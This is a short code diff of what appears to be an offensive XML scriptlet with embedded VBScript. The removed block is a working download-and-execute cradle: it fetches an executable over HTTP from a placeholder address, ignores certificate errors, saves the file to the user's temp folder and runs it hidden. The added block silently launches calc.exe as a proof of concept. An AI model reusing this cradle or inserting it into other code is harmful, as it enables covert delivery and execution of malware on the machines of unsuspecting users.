@@ -11,20 +11,9 @@
 	<script language="VBScript">
 		<![CDATA[
 	
-			Const adTypeBinary = 1
-			Const adSaveCreateOverWrite = 2
-			Dim http,ado
-			Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
-			http.SetOption 2, 13056
-			http.open "GET","http://127.0.0.1/putty.exe",False
-			http.send
-			Set ado = createobject("Adodb.Stream")
-			ado.Type = adTypeBinary
-			ado.Open
-			ado.Write http.responseBody
-			ado.SaveToFile "C:\\Users\\%USERNAME%\\AppData\\local\\temp\\putty.exe"
-			ado.Close
-			CreateObject("WScript.Shell").Run "C:\\Users\\%USERNAME%\\AppData\\local\\temp\\putty.exe",0,true 
+		Set WshShell = WScript.CreateObject("WScript.Shell")	
+		WshShell.Run "calc.exe", 0, False
+		 
 	
 		]]>
 </script>
